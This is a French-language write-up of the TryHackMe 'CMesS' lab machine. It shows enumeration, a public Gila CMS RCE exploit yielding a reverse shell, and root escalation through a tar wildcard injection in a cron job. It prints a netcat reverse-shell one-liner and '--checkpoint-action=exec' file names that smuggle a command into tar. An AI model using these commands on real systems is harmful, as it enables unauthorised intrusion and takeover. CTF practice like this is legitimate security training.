# THM CMesS
De l'exploit, de l'énumération, de la recherche. Une bonne room sympatoche !

IP : 10.10.41.234

# Enum
## Nmap:
```nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-10 09:20 EST
Nmap scan report for 10.10.41.234
Host is up (0.036s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-generator: Gila CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.89 seconds
```
## subdomain enumeration :
```
┌──(kali㉿kali)-[~]
└─$ wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://cmess.thm' -H "Host: FUZZ.cmess.thm" --hw 290 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://cmess.thm/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                        
=====================================================================

000000019:   200        30 L     104 W      934 Ch      "dev"                                                                                                          

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0
```
Je retrouve donc ici un subdomain dev.cmess.thm

Une fois ajouter dans le fichier hosts, on retrouve bien une page derrière avec des informations utiles !
```
Development Log
andre@cmess.thm

Have you guys fixed the bug that was found on live?
support@cmess.thm

Hey Andre, We have managed to fix the misconfigured .htaccess file, we're hoping to patch it in the upcoming patch!
support@cmess.thm

Update! We have had to delay the patch due to unforeseen circumstances
andre@cmess.thm

That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.
support@cmess.thm

Your password has been reset. Here: ***********
```

On a donc le compte pour acceder a l'admin panel
Compte :

```
andre@cmess.thm
**************
```
# RCE
La version de Gila est la 1.10.9, celle-ci est vulnérable et une RCE est exploitable. 

L'exploit ce trouve ici: https://www.exploit-db.com/exploits/51569

```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/CMesS]
└─$ python3 51569.py

 ██████╗ ██╗██╗      █████╗      ██████╗███╗   ███╗███████╗    ██████╗  ██████╗███████╗                                                                                         
██╔════╝ ██║██║     ██╔══██╗    ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔════╝██╔════╝                                                                                         
██║  ███╗██║██║     ███████║    ██║     ██╔████╔██║███████╗    ██████╔╝██║     █████╗                                                                                           
██║   ██║██║██║     ██╔══██║    ██║     ██║╚██╔╝██║╚════██║    ██╔══██╗██║     ██╔══╝                                                                                           
╚██████╔╝██║███████╗██║  ██║    ╚██████╗██║ ╚═╝ ██║███████║    ██║  ██║╚██████╗███████╗                                                                                         
 ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝     ╚═════╝╚═╝     ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝╚══════╝                                                                                         
                                                                                                                                                                                
                              by Unknown_Exploit                                                                                                                                
                                                                                                                                                                                
Enter the target login URL (e.g., http://example.com/admin/): http://cmess.thm/admin
Enter the email: andre@cmess.thm
Enter the password: ***********
Enter the local IP (LHOST): {MON IP}
Enter the local port (LPORT): 4444
File uploaded successfully.
```
Et nous voila avec un revshell 
```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444                 
listening on [any] 4444 ...
connect to [{MON IP}] from (UNKNOWN) [10.10.41.234] 36216
bash: cannot set terminal process group (725): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cmess:/var/www/html/tmp$
```

# Privesc
On farfouillant un peu on retrouve dans le dossier /opt un fichier intéressant
```
www-data@cmess:/$ cd /opt
www-data@cmess:/opt$ ls -la
total 12
drwxr-xr-x  2 root root 4096 Feb  6  2020 .
drwxr-xr-x 22 root root 4096 Feb  6  2020 ..
-rwxrwxrwx  1 root root   36 Feb  6  2020 .password.bak
www-data@cmess:/opt$ cat .password.bak 
andres backup password
UQf*******
```
Nous voila désormais connecter en tant qu'andre 
```
www-data@cmess:/opt$ su andre
Password: 
andre@cmess:/opt$ 
```
On trouve le 1er flag dans le home de andre :
```
andre@cmess:~$ cat user.txt 
thm{c52**************************}
```
# Privesc to root !
J'importe lse et l'executer. Il trouve quelque chose d'intéressant dans les taches cron :
```
[!] ret060 Can we write to executable paths present in cron jobs........... yes!
---
/etc/crontab:*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```
Dans le dossier backup, on retrouve une fichier note qui indique :
```
andre@cmess:~/backup$ cat note 
Note to self.
Anything in here will be backed up!
```
On va utilise les checkpoints de tar pour executer un shell.

1) On créer le shell
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {MON IP} 1234 >/tmp/f" > shell.sh
```
2) On configurer les checkpoint
```
touch -- --checkpoint=1
touch -- "--checkpoint-action=exec=sh shell.sh"
```
3) On ouvre un listener sur notre machine
```
nc -lnvp 1234
```
4) On attend que la tache cron s'executer .
Et nous voila root
```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234                       
listening on [any] 1234 ...
connect to [{MON IP}] from (UNKNOWN) [10.10.41.234] 39532
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```
Le flag est toujours au même endroit
```
# cat /root/root.txt    
thm{9f****************************}
```
